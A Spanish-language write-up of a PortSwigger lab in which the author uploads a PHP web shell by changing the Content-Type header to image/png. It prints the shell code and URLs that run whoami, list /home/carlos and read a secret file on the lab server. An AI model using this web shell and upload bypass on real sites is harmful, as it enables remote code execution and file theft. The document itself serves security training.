---
title: "Web shell upload via Content-Type restriction bypass"
date: 2024-11-24 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - File Upload Vulnerabilities
tags:
  - File Upload Vulnerabilities
  - Web shell upload via Content-Type restriction bypass
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` contiene una `función` de carga de imágenes `vulnerable` que intenta `evitar` que los usuarios `suban` tipos de `archivos inesperados`, pero se basa en verificar una entrada controlada por el usuario para hacerlo. Para `resolver` el `laboratorio`, debemos `subir` una `web shell` básica en `PHP`, usarla para `extraer` el `contenido` del archivo `/home/carlos/secret` y luego usar este `secreto` utilizando el botón proporcionado en la barra del laboratorio. Podemos `iniciar sesión` en nuestra `cuenta` usando las siguientes credenciales: `wiener:peter`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/File-Upload-Vulnerabilities-Lab-2/image_1.png)

Pulsamos en `My account` e `iniciamos sesión` con las credenciales `wiener:peter`

![](/assets/img/File-Upload-Vulnerabilities-Lab-2/image_2.png)

Vemos que existe un `campo` de `subida` de `archivos`

![](/assets/img/File-Upload-Vulnerabilities-Lab-2/image_3.png)

Si `inspeccionamos` con donde se `aloja` la `imagen` vemos que es en la ruta `/resources/images`

![](/assets/img/File-Upload-Vulnerabilities-Lab-2/image_4.png)

Nos `creamos` un `archivo` llamado `shell.php` y lo `subimos`

```
<?php
    echo "<pre>" . system($_REQUEST['cmd']) . "</pre>";
?>
```

Al intentar subirlo vemos que nos da este `error`

![](/assets/img/File-Upload-Vulnerabilities-Lab-2/image_5.png)

`Subimos` el `archivo` nuevamente y `capturamos` la `petición` con `Burpsuite`

![](/assets/img/File-Upload-Vulnerabilities-Lab-2/image_6.png)

Cambiamos el `Content-Type` a `image/png` y `subimos` el `archivo`, posteriormente abrimos nuevamente el `inspector` de `chrome` y vemos que el `archivo` subido se `aloja` en `/files/avatars`

![](/assets/img/File-Upload-Vulnerabilities-Lab-2/image_7.png)

Si accedemos a `https://0aa000d704efa5eb8202c09f005a0081.web-security-academy.net/files/avatars/shell.php?cmd=whoami` veremos que tenemos un `RCE (Remote Code Execution)`

![](/assets/img/File-Upload-Vulnerabilities-Lab-2/image_8.png)

Si accedemos a `https://0aa000d704efa5eb8202c09f005a0081.web-security-academy.net/files/avatars/shell.php?cmd=ls%20/home/carlos` vemos un `archivo` llamado `secret`

![](/assets/img/File-Upload-Vulnerabilities-Lab-2/image_9.png)

Leemos la información de ese archivo con `https://0aa000d704efa5eb8202c09f005a0081.web-security-academy.net/files/avatars/shell.php?cmd=cat%20/home/carlos/secret`

![](/assets/img/File-Upload-Vulnerabilities-Lab-2/image_10.png)

Pulsamos en `Submit solution` y `mandamos` nuestra `solución`

![](/assets/img/File-Upload-Vulnerabilities-Lab-2/image_11.png)
